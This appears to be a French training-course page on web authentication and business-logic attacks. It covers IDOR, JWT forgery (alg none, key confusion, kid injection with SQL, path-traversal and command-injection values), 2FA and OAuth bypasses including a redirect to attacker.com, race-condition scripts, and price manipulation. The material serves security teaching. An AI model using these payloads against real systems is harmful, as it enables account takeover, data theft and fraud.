@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>M3 — Authentification &amp; Logique métier</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap');
+  :root { --bg:#0a0e14; --bg-card:#131820; --bg-card-hover:#1a2332; --border:#1e2d3d; --accent:#e63946; --accent2:#ff6b6b; --text:#bfc7d5; --text-muted:#6b7a8d; --text-bright:#e6ecf3; --green:#44d7b6; --orange:#ff9f43; --blue:#54a0ff; --purple:#a55eea; --code-bg:#0d1117; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); min-height:100vh; line-height:1.6; }
+  .bg-grid { position:fixed; top:0;left:0;right:0;bottom:0; background-image:linear-gradient(rgba(230,57,70,0.03) 1px, transparent 1px),linear-gradient(90deg, rgba(230,57,70,0.03) 1px, transparent 1px); background-size:40px 40px; pointer-events:none; z-index:0; }
+  .container { max-width:960px; margin:0 auto; padding:0 24px; position:relative; z-index:1; }
+  .back-link { display:inline-flex; align-items:center; gap:8px; color:var(--text-muted); text-decoration:none; font-size:0.85rem; margin:30px 0 20px; transition:color 0.2s; }
+  .back-link:hover { color:var(--accent2); }
+
+  .module-hero { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:40px; margin-bottom:40px; border-left:5px solid var(--purple); }
+  .module-hero .tag { font-family:'Fira Code',monospace; font-size:0.8rem; background:rgba(165,94,234,0.15); color:var(--purple); padding:4px 14px; border-radius:20px; display:inline-block; margin-bottom:16px; }
+  .module-hero h1 { font-size:2rem; color:var(--text-bright); font-weight:700; margin-bottom:8px; }
+  .module-hero .meta { font-size:0.9rem; color:var(--text-muted); font-family:'Fira Code',monospace; }
+  .module-hero .desc { margin-top:16px; color:var(--text); font-size:0.95rem; line-height:1.7; }
+
+  .section { margin-bottom:40px; }
+  .section h2 { font-size:1.25rem; color:var(--text-bright); margin-bottom:16px; padding-bottom:10px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+  .section h2 .num { width:32px; height:32px; border-radius:8px; display:inline-flex; align-items:center; justify-content:center; font-family:'Fira Code',monospace; font-size:0.85rem; font-weight:600; background:rgba(165,94,234,0.12); color:var(--purple); }
+
+  .card { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; padding:24px; margin-bottom:16px; }
+  .card h3 { font-size:1.05rem; color:var(--text-bright); margin-bottom:10px; }
+  .card p, .card li { font-size:0.93rem; color:var(--text-muted); line-height:1.7; }
+  .card ul, .card ol { padding-left:20px; margin-top:8px; }
+  .card li { margin-bottom:6px; }
+
+  .code-block { position:relative; margin:12px 0; border-radius:8px; border:1px solid var(--border); overflow:hidden; }
+  .code-block pre { background:var(--code-bg); padding:18px 20px; overflow-x:auto; font-family:'Fira Code',monospace; font-size:0.85rem; line-height:1.6; color:var(--text); margin:0; }
+  .copy-btn { position:absolute; top:8px; right:10px; background:var(--bg-card); border:1px solid var(--border); color:var(--text-muted); padding:4px 12px; border-radius:5px; cursor:pointer; font-family:'Fira Code',monospace; font-size:0.75rem; transition:all 0.2s; display:flex; align-items:center; gap:5px; }
+  .copy-btn:hover { color:var(--text-bright); border-color:var(--purple); }
+  .copy-btn.copied { color:var(--green); border-color:var(--green); }
+
+  .highlight { color:var(--accent2); font-weight:500; }
+  .green { color:var(--green); }
+  .blue { color:var(--blue); }
+  .purple { color:var(--purple); }
+  .attck-tag { font-family:'Fira Code',monospace; font-size:0.75rem; background:rgba(68,215,182,0.1); color:var(--green); padding:2px 8px; border-radius:4px; margin-left:6px; white-space:nowrap; }
+
+  footer { text-align:center; padding:40px 0; color:var(--text-muted); font-size:0.82rem; border-top:1px solid var(--border); margin-top:20px; }
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="container">
+
+<a href="../index.html" class="back-link">&larr; Retour au sommaire</a>
+
+<div class="module-hero">
+  <span class="tag">Module 3</span>
+  <h1>Authentification &amp; Logique métier</h1>
+  <p class="meta">J1 &middot; 13h30—14h30 &middot; 1h &middot; Théorie + TP guidé</p>
+  <p class="desc">
+    Les failles d'authentification et de logique métier sont souvent les plus critiques et les plus difficiles à automatiser. Ce module couvre l'élévation de privilèges, le contournement d'authentification (JWT, OAuth, 2FA), les race conditions et les abus de workflow métier.
+  </p>
+</div>
+
+<!-- 1. Broken Access Control -->
+<div class="section">
+  <h2><span class="num">1</span> Broken Access Control <span class="attck-tag">T1548 / T1134</span></h2>
+
+  <div class="card">
+    <h3>IDOR — Insecure Direct Object Reference</h3>
+    <p>L'application expose des identifiants directs d'objets sans vérifier les droits d'accès.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'idor')">&#128203; Copier</button>
+      <pre id="idor"># Exemples d'IDOR
+GET /api/user/1234/profile          → changer 1234 en 1235
+GET /api/invoice?file=inv_042.pdf   → essayer inv_043.pdf
+POST /api/order/889/cancel           → annuler une commande d'un autre
+
+# IDOR via UUID (moins trivial mais possible)
+GET /api/documents/550e8400-e29b-41d4-a716-446655440000
+# UUID prédictible ? Problème de GUID v1 (basé sur MAC + timestamp)
+
+# IDOR via paramètre caché
+POST /api/transfer
+{"to": "attacker", "amount": 100, "from": "victim"}
+# L'API truste le paramètre "from" !</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Privilege Escalation horizontale &amp; verticale</h3>
+    <table style="width:100%;border-collapse:collapse;">
+      <tr style="border-bottom:1px solid var(--border);"><th style="text-align:left;padding:8px;color:var(--text-bright);">Type</th><th style="text-align:left;padding:8px;color:var(--text-bright);">Description</th><th style="text-align:left;padding:8px;color:var(--text-bright);">Exemple</th></tr>
+      <tr style="border-bottom:1px solid var(--border);"><td style="padding:8px;">Horizontale</td><td style="padding:8px;color:var(--text-muted);">Accéder aux données d'un utilisateur de même niveau</td><td style="padding:8px;color:var(--text-muted);">IDOR sur /profil</td></tr>
+      <tr><td style="padding:8px;">Verticale</td><td style="padding:8px;color:var(--text-muted);">Accéder à des fonctionnalités d'un rôle supérieur</td><td style="padding:8px;color:var(--text-muted);">Accéder à /admin sans vérification</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>NIS2 &amp; Authentification</h3>
+    <p>La directive NIS2 (art. 21) exige une authentification multifacteur (MFA), une gestion stricte des droits d'accès et une politique de moindre privilège. Les failles IDOR, JWT et de logique métier exposent directement les entités à des violations de données, sanctionnables jusqu'à 10M€ ou 2% du CA mondial.</p>
+  </div>
+</div>
+
+<!-- 2. JWT -->
+<div class="section">
+  <h2><span class="num">2</span> Attaques JWT <span class="attck-tag">T1078 / T1134</span></h2>
+
+  <div class="card">
+    <h3>Rappel : structure d'un JWT</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'jwt-struct')">&#128203; Copier</button>
+      <pre id="jwt-struct">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9          ← Header (base64)
+.
+eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9    ← Payload (base64)
+.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Attaque 1 : None algorithm</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'jwt-none')">&#128203; Copier</button>
+      <pre id="jwt-none"># Si le serveur accepte l'algorithme "none"
+# Modifier le header : {"alg":"none","typ":"JWT"}
+# Garder le payload (modifier "role":"admin")
+# Supprimer la signature (mais garder le point final)
+
+Header:  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
+Payload: eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==
+Token:   <header>.<payload>.  (point final vide)</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Attaque 2 : HMAC/RSA confusion</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'jwt-confusion')">&#128203; Copier</button>
+      <pre id="jwt-confusion"># Si la clé publique RSA est exposée, forger un JWT signé en HMAC
+# Le serveur vérifie avec la clé publique en HMAC au lieu de RSA
+
+# Étape 1 : modifier le header
+{"alg":"HS256","typ":"JWT"}
+
+# Étape 2 : signer le payload avec la clé publique RSA comme secret HMAC
+import jwt
+public_key = open('public.pem').read()
+payload = {"user":"admin","role":"admin"}
+token = jwt.encode(payload, public_key, algorithm='HS256')</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Attaque 3 : kid injection (Key ID)</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'jwt-kid')">&#128203; Copier</button>
+      <pre id="jwt-kid"># Si le paramètre "kid" est utilisé pour récupérer la clé
+# Injection SQL dans le kid
+{"alg":"RS256","typ":"JWT","kid":"1' UNION SELECT 'hacked'--"}
+
+# Path traversal dans le kid
+{"alg":"RS256","typ":"JWT","kid":"../../../../dev/null"}
+
+# Injection de commande dans le kid
+{"alg":"RS256","typ":"JWT","kid":"/dev/null;id"}</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 3. 2FA bypass & OAuth -->
+<div class="section">
+  <h2><span class="num">3</span> 2FA Bypass &amp; OAuth flaws <span class="attck-tag">T1078</span></h2>
+
+  <div class="card">
+    <h3>Techniques de contournement 2FA</h3>
+    <ul>
+      <li><strong>Force brute du code</strong> : pas de rate-limiting sur le TOTP à 6 chiffres</li>
+      <li><strong>Response manipulation</strong> : changer <code>{"2fa_verified": false}</code> en <code>true</code></li>
+      <li><strong>Direct endpoint access</strong> : accéder à <code>/dashboard</code> directement après login sans 2FA</li>
+      <li><strong>Race condition</strong> : envoyer 100 requêtes simultanées, une passe avant la vérification 2FA</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h3>OAuth 2.0 flaws</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'oauth-flaws')">&#128203; Copier</button>
+      <pre id="oauth-flaws"># 1. redirect_uri non validé → vol de code d'autorisation
+GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://attacker.com/callback
+
+# 2. CSRF sur l'initiation OAuth (state non vérifié)
+# Attacher son propre compte social au compte de la victime
+
+# 3. scope upgrade
+# Demander scope=openid email admin.read
+# Si le serveur ne vérifie pas les scopes autorisés pour ce client
+
+# 4. replay du code d'autorisation
+# Intercepter le code OAuth et le réutiliser</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 4. Race conditions -->
+<div class="section">
+  <h2><span class="num">4</span> Race Conditions &amp; TOCTOU <span class="attck-tag">T1068</span></h2>
+
+  <div class="card">
+    <h3>Time-of-check Time-of-use</h3>
+    <p>Entre le moment où le serveur <strong>vérifie</strong> une condition et le moment où il <strong>exécute</strong> l'action, un attaquant peut modifier l'état.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'race-condition')">&#128203; Copier</button>
+      <pre id="race-condition"># Exemple : coupon à usage unique
+# Le serveur vérifie si le coupon est valide PUIS le marque comme utilisé
+# Envoi de 50 requêtes simultanées → certaines passent avant l'invalidation
+
+# Avec Turbo Intruder (Burp Suite)
+# Script race-single-packet-attack.py
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=50,
+                           engine=Engine.BURP2)
+    for i in range(50):
+        engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Exemples de race conditions</h3>
+    <ul>
+      <li><strong>Double spending</strong> : utiliser deux fois le même code promo / bon cadeau</li>
+      <li><strong>Vote multiple</strong> : voter plusieurs fois en envoyant les requêtes simultanément</li>
+      <li><strong>Limit bypass</strong> : dépasser une limite de téléchargement/upload</li>
+      <li><strong>2FA bypass</strong> : accéder à la ressource avant la validation 2FA (race avec le code)</li>
+    </ul>
+  </div>
+</div>
+
+<!-- 5. Business logic -->
+<div class="section">
+  <h2><span class="num">5</span> Logique métier — Workflow abuse</h2>
+
+  <div class="card">
+    <h3>Patterns classiques</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this, 'biz-logic')">&#128203; Copier</button>
+      <pre id="biz-logic"># 1. Manipulation de prix
+POST /order
+{"product_id": 42, "quantity": 1, "price": 0.01}
+# Si le serveur accepte le prix envoyé par le client
+
+# 2. Integer overflow
+POST /transfer {"amount": -1000000}
+# Virement négatif = crédit ?
+
+# 3. Workflow step skipping
+# Panier → Adresse → Paiement → Confirmation
+# Accéder directement à /order/confirm?cart_id=123
+
+# 4. Parameter pollution
+POST /checkout?coupon=VIP20
+Body: {"coupon": "VIP80"}
+# Lequel est pris en compte ? Les deux ?</pre>
+    </div>
+  </div>
+</div>
+
+<footer>
+  M3 — Authentification &amp; Logique métier · Jour 1 &nbsp;|&nbsp; <a href="../index.html" style="color:var(--purple);text-decoration:none;">&larr; Sommaire</a>
+</footer>
+
+<div class="section">
+  <h2><span class="num">R</span> Références</h2>
+  <div class="card">
+    <ul>
+      <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank">OWASP Broken Access Control</a></li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens" target="_blank">OWASP JWT Attacks</a></li>
+      <li><a href="https://portswigger.net/web-security/jwt" target="_blank">PortSwigger — JWT Attacks</a></li>
+      <li><a href="https://jwt.io/" target="_blank">jwt.io (debugger)</a></li>
+      <li><a href="https://owasp.org/www-community/attacks/Race_Condition" target="_blank">OWASP Race Conditions</a></li>
+      <li><a href="https://portswigger.net/web-security/race-conditions" target="_blank">PortSwigger — Race Conditions</a></li>
+      <li><a href="https://cyber.gouv.fr/publications/recommandations-de-securite-relatives-au-mfa" target="_blank">ANSSI — Authentification multifacteur</a></li>
+      <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger — CSRF</a></li>
+    </ul>
+  </div>
+</div>
+
+</div>
+
+<script>
+function copyCode(btn, id) {
+  const el = document.getElementById(id);
+  navigator.clipboard.writeText(el.innerText).then(() => {
+    btn.innerHTML = '&#10003; Copié !';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.innerHTML = '&#128203; Copier'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+</script>
+</body>
+</html>
